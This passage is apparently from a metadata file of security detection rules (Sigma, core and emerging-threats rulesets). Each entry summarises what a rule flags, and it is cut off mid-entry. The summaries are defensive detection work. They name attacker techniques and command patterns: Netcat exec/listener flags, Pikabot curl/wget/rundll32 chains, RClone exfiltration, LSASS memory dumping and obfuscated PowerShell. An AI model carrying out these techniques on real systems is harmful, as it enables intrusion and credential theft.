  Ruleset: sigmahq
  Summary: This rule detects registry modifications that disable or alter the functionality
    of certain internal Windows tools and features, a technique often employed by
    malware such as Agent Tesla. It identifies changes to specific registry paths
    that either enable or disable various system policies and components, such as
    disabling the Task Manager, the Registry Editor, or the ability to change passwords,
    as well as affecting toast notifications and write protection settings. These
    changes are captured by monitoring for specific DWORD values within targeted registry
    keys.
  Updated-Date: '2024_09_04'
e2812b49-bae0-4b21-b366-7c142eafcde2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8b4b3620d1ab36ceb1c2619ec487662a
  Ruleset: sigmahq
  Summary: This rule detects the use of the WMI class "Win32_NTEventlogFile" in a
    potentially suspicious manner, specifically when actions such as deleting, backing
    up, or changing permissions are performed through a PowerShell script. The detection
    focuses on identifying specific function calls within the script that indicate
    these actions. This may include functions like `.BackupEventlog()`, `.ChangeSecurityPermissions()`,
    `.ClearEventLog()`, `.Delete()`, and `.TakeOwnerShip()`, among others. These functions,
    when invoked, may signify attempts to manipulate event log files, which can be
    indicative of defense evasion techniques.
  Updated-Date: '2024_09_04'
e290b10b-1023-4452-a4a9-eb31a9013b3a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c2b5a942d308d7ea5df4cbc724a3fc24
  Ruleset: sigmahq
  Summary: This rule detects data exfiltration attempts using DataSvcUtil.exe, a utility
    associated with WCF Data Services in the .NET framework. It monitors specific
    command line arguments and the execution of DataSvcUtil.exe by looking for parameters
    like '/in:', '/out:', and '/uri:'. The detection focuses on identifying the execution
    of this utility to prevent unauthorized data transfers potentially leveraging
    its functionality.
  Updated-Date: '2024_09_04'
e2b5163d-7deb-4566-9af3-40afea6858c3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 72d98e02ea0d3850b6edba167f61d458
  Ruleset: sigmahq
  Summary: This rule detects when an application on a Windows system acquires a certificate
    private key by monitoring Event ID 70 in the CAPI2 Operational log. This activity
    may indicate an attempt at credential access, specifically under the T1649 tactic.
    It is important to note that legitimate applications requesting certificate exports
    may trigger this detection, necessitating additional filtering to reduce false
    positives.
  Updated-Date: '2024_09_04'
e2e01011-5910-4267-9c3b-4149ed5479cf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6e5dde2a3a0c43e39d672a52c565e955
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "wwlib.dll", a practice
    where a legitimate application is tricked into loading a malicious DLL. This can
    often occur during defense evasion or privilege escalation attacks. Specifically,
    it identifies instances where "wwlib.dll" is loaded by applications that do not
    reside in standard Microsoft Office installation directories, suggesting unauthorized
    manipulation.
  Updated-Date: '2024_09_04'
e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 22cc3cbeede31ff03f40dc1ab30531c2
  Ruleset: sigmahq
  Summary: This rule detects attempts to compress or encrypt data using WINZIP prior
    to exfiltration, characterized by the execution of 'winzip.exe' or 'winzip64.exe'
    commands with specific parameters for setting passwords and minimizing the application
    window.
  Updated-Date: '2024_09_04'
e30de276-68ec-435c-ab99-ef3befec6c61:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2104a952dc55e416bcc1a531df3afe79
  Ruleset: sigmahq
  Summary: This rule detects instances where a SIP (Session Initiation Protocol) service
    on an OpenCanary node receives a SIP request, indicating that the node may be
    the target of potential reconnaissance or attack activities. OpenCanary is a honeypot
    framework designed to emulate various services and deceive malicious actors. Monitoring
    SIP requests can help identify unauthorized or suspicious interaction attempts
    with the SIP service, which might be indicative of malicious behavior such as
    VoIP attacks or network scanning.
  Updated-Date: '2024_09_04'
e31033fc-33f0-4020-9a16-faf9b31cbf08:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b2e01a7122f817fd38ac67c382bcbb50
  Ruleset: core
  Summary: This rule detects the execution of Netcat on Windows systems, which adversaries
    may use for communication between a host and a command and control (C2) server
    or among infected hosts within a network using non-application layer protocols.
    The detection focuses on specific executable file names such as 'nc.exe', 'ncat.exe',
    and 'netcat.exe', as well as command lines containing typical Netcat parameters
    like '-lvp', '-lvnp', '-l -v -p', '-lv -p', '-l --proxy-type http', '-vnl --exec',
    '-vnl -e', '--lua-exec', and '--sh-exec'.
  Updated-Date: '2024_09_03'
e312efd0-35a1-407f-8439-b8d434b438a6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9ac895829a0ac43211d228d24019ae89
  Ruleset: core
  Summary: This rule detects suspicious PowerShell commands that utilize encoded character
    syntax often associated with defense evasion techniques. Specifically, it identifies
    the use of the "(WCHAR)0x" pattern in command lines, which can be indicative of
    obfuscation methods used to hide malicious activities. The detection of such patterns
    is critical for identifying potential threats and mitigating their impact on Windows
    systems.
  Updated-Date: '2024_09_03'
e32d4572-9826-4738-b651-95fa63747e8a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c81e832f6c7e3b1270fb7c4967a98ae1
  Ruleset: core
  Summary: This rule detects the usage of the "FromBase64String" function in the command
    line, which is employed to decode a Base64 encoded string. This activity may indicate
    an attempt to execute encoded commands, potentially as part of an evasion technique
    or to obfuscate malicious actions in a Windows environment.
  Updated-Date: '2024_09_03'
e32f92d1-523e-49c3-9374-bdb13b46a3ba:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 922b32670f4eeab83326d7c12bed76ae
  Ruleset: core
  Summary: This rule detects suspicious execution patterns of the `mshta.exe` process
    on Windows systems. The `mshta.exe` utility is used to execute Microsoft HTML
    Applications (HTA), and suspicious activity can indicate potential misuse by malicious
    actors. The rule identifies instances where `mshta.exe` is launched by unusual
    parent processes such as `cmd.exe`, `powershell.exe`, or `wscript.exe`, or when
    the command line contains references to directories like `AppData\Local` or `C:\Windows\Temp`.
    The rule applies filters to exclude legitimate locations like `C:\Windows\System32`,
    command lines containing `.htm` or `.hta` extensions, and straightforward executions
    of `mshta.exe`.
  Updated-Date: '2024_09_03'
e3393cba-31f0-4207-831e-aef90ab17a8c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 32016bc61d3b1ccd127efefc409d8e1c
  Ruleset: core
  Summary: This rule detects potential compromise of the SAML token issuer associated
    with a SAML token by observing unusual claims or patterns matching known attacker
    behaviors. The detection triggers on events flagged as 'tokenIssuerAnomaly' within
    Azure's risk detection services. Such anomalies suggest that the integrity of
    the token issuer may be compromised, warranting a high level of investigation
    in the context of user sign-in activities.
  Updated-Date: '2024_09_03'
e34cfa0c-0a50-4210-9cb3-5632d08eb041:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 326ccdfa7cbe95046be3bf573b69d7a5
  Ruleset: core
  Summary: This rule detects the use of the command-line utility "grep" to identify
    specific files associated with GobRAT malware on Linux systems. GobRAT is known
    to create files like "apached," "frpc," "sshd.sh," and "zone.arm." By monitoring
    for these file names in commands executed with "grep," indicators of GobRAT activity
    can be identified, highlighting potential security vulnerabilities or compromises.
  Updated-Date: '2024_09_03'
e37db05d-d1f9-49c8-b464-cee1a4b11638:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d30362e3085292af457b68fc91684549
  Ruleset: core
  Summary: This rule detects the execution of RClone, a utility often utilized for
    data exfiltration by various ransomware strains including REvil, Conti, and FiveHands.
    RClone facilitates file transfers and synchronization with cloud storage services,
    and its usage in these contexts typically involves specific command line arguments
    and options such as '--config', '--no-check-certificate', 'copy', 'sync', and
    others. The rule focuses on identifying the RClone executable and its associated
    command line activities to alert on potential malicious exfiltration activities.
  Updated-Date: '2024_09_03'
e3818659-5016-4811-a73c-dde4679169d2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ca1007afcb47192b489fab064618d1e4
  Ruleset: sigmahq
  Summary: This rule detects the use of the PowerShell cmdlet `Reset-ComputerMachinePassword`,
    which changes the computer account password that computers utilize to authenticate
    to domain controllers within a domain. This cmdlet can also be applied to reset
    the password of the local computer.
  Updated-Date: '2024_09_04'
e3845023-ca9a-4024-b2b2-5422156d5527:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a3ab0c9c3745f8279272ec6264c85771
  Ruleset: sigmahq
  Summary: This rule detects the creation of new PowerShell module files, such as
    ".psm1", ".psd1", ".dll", or ".ps1", by processes that are not PowerShell processes.
    This is aimed at identifying potentially unauthorized or suspicious activity where
    a non-PowerShell process generates these module files, which could indicate an
    attempt to persist or compromise a system.
  Updated-Date: '2024_09_04'
e3a8a052-111f-4606-9aee-f28ebeb76776:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d2cba8913390639aaf7bd1f153c5f31a
  Ruleset: sigmahq
  Summary: This rule detects attempts to disable security tools on Linux systems.
    It monitors process creation events for specific commands associated with stopping
    or disabling critical security services such as `iptables`, `ip6tables`, and `firewalld`.
    The rule also covers actions targeting security software like Carbon Black (`cbdaemon`)
    and CrowdStrike Falcon (`falcon-sensor`). Additionally, it detects commands aimed
    at disabling the Security-Enhanced Linux (SELinux) policy enforcement. These actions
    can indicate an attempt to evade defenses and degrade system security.
  Updated-Date: '2024_09_04'
e3b50fa5-3c3f-444e-937b-0a99d33731cd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9facf092fa4511d34be10d33dd8f282b
  Ruleset: core
  Summary: This rule detects the modification of Outlook security settings to allow
    the unprompted execution of macros. This activity can potentially enable persistent
    threats and unauthorized command-and-control operations by bypassing the security
    warnings typically prompted when macros are executed. The detection mechanism
    focuses on changes to specific registry settings that control macro security levels
    within Outlook, specifically looking for configurations that enable all macros
    without any warnings.
  Updated-Date: '2024_09_03'
e3f673b3-65d1-4d80-9146-466f8b63fa99:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dcbbe48773600946b82eeeb3c200918e
  Ruleset: sigmahq
  Summary: This rule detects file renames where the target filename exhibits an uncommon
    double extension, such as ".jpg.crypted" or ".docx.locky". This behavior is indicative
    of potential ransomware activity, where files are encrypted and appended with
    a custom extension. The rule focuses on target filenames that contain double extensions,
    typically associated with common document and image formats. However, it excludes
    backups, recovery software extensions, and specific cases related to Anaconda.
    This is useful in identifying malicious file renaming attempts that could signal
    an ongoing ransomware attack.
  Updated-Date: '2024_09_04'
e3fdf743-f05b-4051-990a-b66919be1743:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 567d098fff9359cac9ceac56a674f687
  Ruleset: core
  Summary: This rule detects changes to the user account associated with the FAX service
    in Windows. Such changes could indicate an attempt to avoid escalation problems
    by altering the account responsible for managing the FAX service, potentially
    for malicious purposes. The rule specifically monitors modifications to the registry
    path `HKLM\System\CurrentControlSet\Services\Fax\ObjectName` unless the change
    involves the `NetworkService` account.
  Updated-Date: '2024_09_03'
e402c26a-267a-45bd-9615-bd9ceda6da85:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c72ba75f6a75b21e0bc602bac3b209a7
  Ruleset: core
  Summary: This rule detects accounts in privileged roles that have not signed in
    for a specified number of days in Azure Privileged Identity Management (PIM).
    This can help identify potentially stale accounts, which might indicate orphaned
    or unused privileges that could pose a security risk.
  Updated-Date: '2024_09_03'
e40f4962-b02b-4192-9bfe-245f7ece1f99:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2b3542e62fc25932554c0c4fc64f644
  Ruleset: sigmahq
  Summary: This rule detects instances where a multi-factor authentication (MFA) prompt
    is denied by the user. Such activity may indicate that the user reporting the
    prompt as not initiated by them could suggest that an attacker has obtained the
    account's password. This can be crucial in identifying potential unauthorized
    access attempts. The rule is applied to Azure sign-in logs specifically monitoring
    events where an MFA prompt is denied, signaling possible suspicious or malicious
    activity.
  Updated-Date: '2024_09_04'
e4556676-fc5c-4e95-8c39-5ef27791541f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 53eccae8435d733cce27ee7b93cc150a
  Ruleset: emerging-threats
  Summary: This rule detects the creation of files with double extensions and a space
    by WinRAR, which could indicate an attempt to exploit CVE-2023-38331. This specific
    pattern involves files being located in the Temp directory and generated by WinRAR,
    pointing to a potential zero-day vulnerability exploitation as discussed in related
    technical documentation and blog posts.
  Updated-Date: '2024_09_03'
e4903324-1a10-4ed3-981b-f6fe3be3a2c2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 84aa02b0c67fbedc5b6bc13c5d15a1f8
  Ruleset: core
  Summary: This rule detects potential DLL sideloading of "edputil.dll," which is
    an indicator of the use of a specific WordPad vulnerability. Cybercriminals may
    exploit this vulnerability to spread Qbot malware. The detection focuses on instances
    where the "edputil.dll" file is loaded from directories outside of standard Windows
    system directories like System32, SysWOW64, and WinSxS. This behavior suggests
    a defense evasion or privilege escalation attempt, making it a high-risk event.
  Updated-Date: '2024_09_03'
e49b5745-1064-4ac1-9a2e-f687bc2dd37e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3b87b26b0cd21c688964068b044b453b
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "libcurl.dll" by the "gup.exe"
    process when executed from an uncommon location. DLL sideloading is a technique
    employed by attackers to load a malicious DLL, often for purposes such as defense
    evasion, persistence, or privilege escalation. Specifically, this rule monitors
    the loading of "libcurl.dll" by "gup.exe" (commonly associated with software updates)
    to identify suspicious activity that may indicate malicious intent. Potential
    false positives are unknown.
  Updated-Date: '2024_09_04'
e4a6b256-3e47-40fc-89d2-7a477edd6915:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 294cd89deebc3e42364d84cc2342f494
  Ruleset: sigmahq
  Summary: This rule detects the execution of a Windows system binary from an uncommon
    location. It focuses on critical system executables such as `atbroker.exe`, `audiodg.exe`,
    `bitsadmin.exe`, `certutil.exe`, `cmstp.exe`, `conhost.exe`, `cscript.exe`, `csrss.exe`,
    `dashost.exe`, `dism.exe`, `dllhost.exe`, `dllhst3g.exe`, `dwm.exe`, `eventvwr.exe`,
    `logonui.exe`, `Lsass.exe`, `msiexec.exe`, `ntoskrnl.exe`, `powershell.exe`, `pwsh.exe`,
    `regsvr32.exe`, `rundll32.exe`, `RuntimeBroker.exe`, `schtasks.exe`, `services.exe`,
    `smartscreen.exe`, `spoolsv.exe`, `svchost.exe`, `taskhost.exe`, `Taskmgr.exe`,
    `userinit.exe`, `wininit.exe`, `winlogon.exe`, `winver.exe`, `wlanext.exe`, `wscript.exe`,
    `wsl.exe`, and `wsmprovhost.exe`. To identify potential threats, the rule excludes
    common, legitimate file paths, including locations under `C:\Windows\System32\`.
    The purpose is to flag potentially malicious behavior where these binaries are
    executed from unexpected directories, which can be indicative of an intrusion
    or malware activity, such as actions by the Lazarus Group utilizing executables
    like `dfrgui.exe` and `wsmprovhost.exe`.
  Updated-Date: '2024_09_04'
e4bbc094-ad58-4879-bec7-0ccc60a99a5b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b4eb4f72d1cf7ba90a4e253a35377b3f
  Ruleset: securityonion-resources
  Summary: This rule detects when a Session Initiation Protocol (SIP) service on a
    Security Onion Intrusion Detection Honeypot (IDH) node receives a SIP request.
    SIP is commonly used for initiating, maintaining, and terminating real-time communication
    sessions such as voice and video calls. The IDH node, acting as a honeypot, is
    designed to attract and monitor such activity for security analysis and intrusion
    detection purposes.
  Updated-Date: '2024_08_07'
e4be5675-4a53-426a-8c81-a8bb2387e947:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6e55b5d633c1794e1a7cad533b4dc152
  Ruleset: core
  Summary: This rule detects blocked image or driver load events on Windows systems
    that fail to meet Authenticode signing level requirements or violate the code
    integrity policy. The log source for these detection events is the Code Integrity
    Operational log, specifically targeting Event ID 3077, which signifies that a
    process attempted to load a file that did not comply with the necessary signing
    criteria or policy.
  Updated-Date: '2024_09_03'
e4d22291-f3d5-4b78-9a0c-a1fbaf32a6a4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1de21961ed3e17fef63f0818cbc121f9
  Ruleset: core
  Summary: This rule detects the registration of a new ODBC driver when the driver
    is located in potentially suspicious directories. It focuses on registry changes
    within the `\SOFTWARE\ODBC\ODBCINST.INI\` path, specifically targeting objects
    ending in `\Driver` or `\Setup`. Suspicious locations include various system and
    user directories such as `\PerfLogs\`, `\ProgramData\`, `\Temp\`, `\Users\Public\`,
    and several subdirectories under `\Windows\System32\` and `\Windows\SysWOW64\`.
    The rule aims to identify potentially malicious persistence mechanisms that leverage
    ODBC driver registration in unusual or high-risk locations.
  Updated-Date: '2024_09_03'
e4eaf701-c8ed-4801-ba78-883c1856b298:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dbf98b5969c2e7f888aab7ffaaf28624
  Ruleset: securityonion-resources
  Summary: This rule detects attempted proxy logins to the Microsoft SQL service on
    a Security Onion Intrusion Detection Honeypot (IDH) node.
  Updated-Date: '2024_08_07'
e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 70f9969061a7936ef4a48d95f750a593
  Ruleset: core
  Summary: This rule detects the disabling of HTTP logging on a Windows IIS web server,
    a tactic employed by the Threat Group 3390 (Bronze Union). The detection focuses
    on the use of 'appcmd.exe' with specific command line arguments that set the HTTP
    logging configuration to 'dontLog:true'. This action is typically associated with
    defense evasion techniques.
  Updated-Date: '2024_09_03'
e4f93c99-396f-47c8-bb0f-201b1fa69034:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 157fdd8ccef3eaf2e1b6b90a4f1a2299
  Ruleset: sigmahq
  Summary: This rule detects potential data exfiltration attempts via audio files
    by leveraging PowerShell. It identifies specific patterns in the script block
    text, including the use of mathematical operations, file mode manipulations, and
    binary writing. Additionally, it looks for byte chunks commonly found in WAV file
    headers, which could indicate the conversion of data into audio format for exfiltration
    purposes. This detection method is particularly useful for identifying non-traditional
    data leakage techniques that evade standard network monitoring tools.
  Updated-Date: '2024_09_04'
e4ffe466-6ff8-48d4-94bd-e32d1a6061e2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5e8ac795eeca2c4fe99d3a5c7522c217
  Ruleset: sigmahq
  Summary: This rule detects the execution of the 'nohup' command, which can be used
    by an attacker to keep a process running even after logging out or to break out
    from restricted environments. The 'nohup' command is typically employed to disassociate
    a process from its controlling terminal, ensuring the process remains active.
    This behavior is monitored and flagged as it may indicate suspicious activities
    by an attacker trying to maintain persistent processes on a Linux system.
  Updated-Date: '2024_09_04'
e507feb7-5f73-4ef6-a970-91bb6f6d744f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 02491a8b9c2478165abba47e09550831
  Ruleset: emerging-threats
  Summary: This rule detects activity associated with the Elise backdoor, a malware
    tool utilized by the cyber threat group APT32. Indicators of this backdoor's presence
    include specific behaviors such as process creation linked to `svchost.exe` and
    certain command lines that involve the deletion of files located within the Windows
    caches directory (`NavShExt.dll`). Additionally, paths ending with references
    to `NavShExt.dll` in the AppData directory and specific command line arguments
    containing ',Setting' are also monitored. This detection aims to identify malicious
    operations indicative of Elise backdoor deployment, which is used to execute commands
    and potentially compromise the targeted system.
  Updated-Date: '2024_09_03'
e5144106-8198-4f6e-bfc2-0a551cc8dd94:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f7e8eff150831b52128e03c367bae126
  Ruleset: emerging-threats
  Summary: This rule detects the execution of concatenated commands via "cmd.exe,"
    which is often indicative of a potential Pikabot infection. Pikabot is malware
    known for executing multiple commands using "cmd /c" to download and run additional
    malicious payloads. Specific commands targeted include "curl" and "wget" for payload
    downloading, "ping" and "timeout" for introducing execution delays, and "rundll32"
    for executing malicious DLL files. The rule identifies a combination of these
    commands executed in sequence, which is typical in Pikabot infection scenarios.
  Updated-Date: '2024_09_03'
e52cb31c-10ed-4aea-bcb7-593c9f4a315b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0dd7236a33febcf8b9178cee0b69b9e3
  Ruleset: sigmahq
  Summary: This rule detects attempts to bypass User Account Control (UAC) by hijacking
    the Microsoft Management Console (MMC) Windows Firewall snap-in. This technique
    focuses on capturing process creation events where the parent process is 'mmc.exe'
    and the command line includes 'WF.msc', while excluding processes that end with
    'WerFault.exe'. This activity is indicative of a privilege escalation attempt
    associated with the hijacking of the Windows Firewall management feature.
  Updated-Date: '2024_09_04'
e54979bd-c5f9-4d6c-967b-a04b19ac4c74:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 57f697e6edf18e1a9045d159f86976b1
  Ruleset: sigmahq
  Summary: This rule detects uncommon outbound network activity via the Kerberos default
    port (port 88) on Windows systems. Such activity may indicate potential lateral
    movement or the first stage of privilege escalation through delegation. It specifically
    monitors the initiation of network connections to the Kerberos port and filters
    out known legitimate processes, including `lsass.exe`, `chrome.exe`, `firefox.exe`,
    and `tomcat8.exe`. False positives may include web browsers and third-party applications,
    and establishing an initial baseline is necessary for accurate detection.
  Updated-Date: '2024_09_04'
e54f5149-6ba3-49cf-b153-070d24679126:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a41e99c036e607d1012ae7729764254a
  Ruleset: core
  Summary: This rule detects obfuscated PowerShell scripts using the VAR++ Launch
    method, characterized by the presence of specific patterns in the script block
    text that include constructs resembling `&&set.*(\{\d\}){2,}\\"\s+?-f.*&&.*cmd.*/c`.
    This technique is associated with defense evasion and execution tactics linked
    to the use of obfuscation in PowerShell scripts. It requires Script Block Logging
    to be enabled for detection and aims to identify potentially malicious activities
    by analyzing PowerShell script contents.
  Updated-Date: '2024_09_03'
e55a5195-4724-480e-a77e-3ebe64bd3759:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d05919546eb6c7a72773d79e4b18da08
  Ruleset: core
  Summary: This rule detects the use of an obfuscated PowerShell script utilizing
    the MSHTA application to execute potentially malicious code. Indicators include
    the presence of specific keywords within the script block text, such as "set,"
    "&&," "mshta," "vbscript:createobject," ".run," and "(window.close)." These keywords
    signify the use of MSHTA and VBScript to create and run objects, which is commonly
    associated with attempts to evade defenses and execute unauthorized actions. This
    detection method is particularly useful in identifying sophisticated evasion techniques
    within PowerShell scripts on Windows systems.
  Updated-Date: '2024_09_03'
e568650b-5dcd-4658-8f34-ded0b1e13992:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ea83b4797e0134d9a906576f9c2fbc91
  Ruleset: sigmahq
  Summary: This rule detects the use of `wmic.exe` to compile a list of installed
    firewall and antivirus products. `wmic.exe`, the Windows Management Instrumentation
    Command-line tool, can be exploited by malware entities, including ransomware
    like Maze, for reconnaissance purposes to gather information about security software
    installed on the system. The rule specifically identifies command-line invocations
    of `wmic.exe` that seek details related to `AntiVirusProduct` or `FirewallProduct`
    classes, signaling potential malicious activity.
  Updated-Date: '2024_09_04'
e56d3073-83ff-4021-90fe-c658e0709e72:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a04f40a2c65a29a1a3f5df7ff70333c9
  Ruleset: sigmahq
  Summary: This rule detects instances where a user employs the built-in Windows utility
    "gpresult" to display the Resultant Set of Policy (RSoP) information. This can
    include verbose or detailed output options, typically indicated by the use of
    specific command-line arguments such as '/v' or '/z'. The detection focuses on
    the process creation of "gpresult.exe" with these particular command-line options.
    This activity is significant in the context of security monitoring and attack
    discovery, particularly related to assessing applied Group Policy settings on
    the system.
  Updated-Date: '2024_09_04'
e593cf51-88db-4ee1-b920-37e89012a3c9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 03d784168179ad8f7bdce44c39cb9631
  Ruleset: sigmahq
  Summary: 'This rule detects potentially suspicious activity involving the execution
    of rundll32.exe, which is known for leveraging specific Dynamic Link Libraries
    (DLLs) with living-off-the-land binary (LOLBIN) functionalities. LOLBINs refer
    to utilities available by default in Windows that can be exploited by malicious
    actors for bypassing security mechanisms. The rule scrutinizes command lines that
    involve legitimate DLL calls such as javascript: with .RegisterXLL, various operations
    like OpenURL with url.dll, PrintHTML with mshtml.dll, and multiple other DLL commands
    possibly indicating exploit attempts or evasive maneuvers. Filters are applied
    to exclude common benign uses of rundll32.exe, such as screensaver settings, control
    panel interactions, and start menu related tasks, to minimize false positives.'
  Updated-Date: '2024_09_04'
e59f71ff-c042-4f7a-8a82-8f53beea817e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c5eae9a7437a4357f09be3dcbd92a72d
  Ruleset: emerging-threats
  Summary: This rule detects a unique URL marker observed in connection with the RomCom
    malware potentially exploiting CVE-2023-36884. The detection focuses on a specific
    pattern in web traffic, specifically a GET request containing the string "/MSHTML_C7/".
    This activity indicates a possible command-and-control communication linked to
    RomCom malware, which has been associated with targeting Ukraine and NATO membership
    talks.
  Updated-Date: '2024_09_03'
e5a29b54-6fe7-4258-8a23-82960e31231a:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: caf6e2bda2c681690a8a058b4bee1188
  Ruleset: emerging-threats
  Summary: This rule detects a crash of "WinRAR.exe" in versions lower than 6.23,
    which could indicate potential exploitation of CVE-2023-40477. The rule identifies
    application errors based on specific event logs and filters out crashes associated
    with newer versions of the software. Exploitation of this vulnerability could
    lead to a security breach, making it critical to monitor crashes in older versions
    of WinRAR for signs of attack.
  Updated-Date: '2024_09_03'
e5b33f7d-eb93-48b6-9851-09e1e610b6d7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 861162aeb1b427ed0c9ef981ede4e1de
  Ruleset: core
  Summary: This rule detects attempts to dump the memory of the LSASS process using
    tools like Mimikatz, NanoDump, Invoke-Mimikatz, Procdump, or Taskmgr. The detection
    is based on identifying the `WerFault.exe` process accessing the `lsass.exe` process
    with a high level of memory access rights, which is indicative of credential dumping
    activities on Windows 10, Windows Server 2016, and later versions.
  Updated-Date: '2024_09_03'
e5d36acd-acb4-4c6f-a13f-9eb203d50099:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e295be56640e248e210e084b89456e30
  Ruleset: sigmahq
  Summary: This rule detects the execution of the utility "csvde.exe" used to export
    the organizational structure of Active Directory. It focuses on identifying instances
    where the command line includes the export parameter, which signifies the intent
    to extract directory data. The utility "csvde.exe" is commonly used for importing
    and exporting data to and from Active Directory in CSV format. The detection criteria
    exclude cases where the command line indicates an import operation, differentiating
    legitimate from potentially suspicious usage.
  Updated-Date: '2024_09_04'
e61e8a88-59a9-451c-874e-70fcc9740d67:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f59097858537c30d2337e4bbc63a65df
  Ruleset: core
  Summary: This rule detects the installation of a DNS server plugin Dynamic Link
    Library (DLL) via the ServerLevelPluginDll parameter in the Windows registry.
    This method can be used to execute code within the context of the DNS server,
    although a server restart is required for the changes to take effect.
  Updated-Date: '2024_09_03'
e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1a8da1f3e5964a8e25636ae2665686a0
  Ruleset: sigmahq
  Summary: This rule detects the execution of `certutil.exe` with the `-encode` flag,
    which is used to encode a file to Base64 format. The flag can be exploited by
    threat actors for data exfiltration purposes. `Certutil.exe` is a command-line
    utility included in Windows that can handle various certificate services, including
    encoding files. The detection is based on identifying the specific process and
    command-line patterns associated with this usage.
  Updated-Date: '2024_09_04'
e6313acd-208c-44fc-a0ff-db85d572e90e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 790e1caccad7daee85d4ae6a3ff3f448
  Ruleset: core
  Summary: This rule detects suspicious network-related commands often used during
    the reconnaissance stages of a cyber attack. It specifically looks for command
    line activity that involves 'nslookup' and '_ldap._tcp.dc._msdcs.', which are
    commonly utilized to gather network information. The focus is on identifying potential
    misuse that aligns with tactics such as discovery outlined in the ATT&CK framework.
    False positive detections can occur if legitimate scripts or administrative tools
    invoke these commands in the monitored environment.
  Updated-Date: '2024_09_03'
e6474a1b-5390-49cd-ab41-8d88655f7394:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 08360c5fedcd5629493b331e35873a4a
  Ruleset: core
  Summary: This rule detects the execution of a renamed version of the "Mavinject"
    process, which can be exploited to perform process injection using the "/INJECTRUNNING"
    flag. Mavinject is a legitimate Microsoft tool used for DLL injection, but it
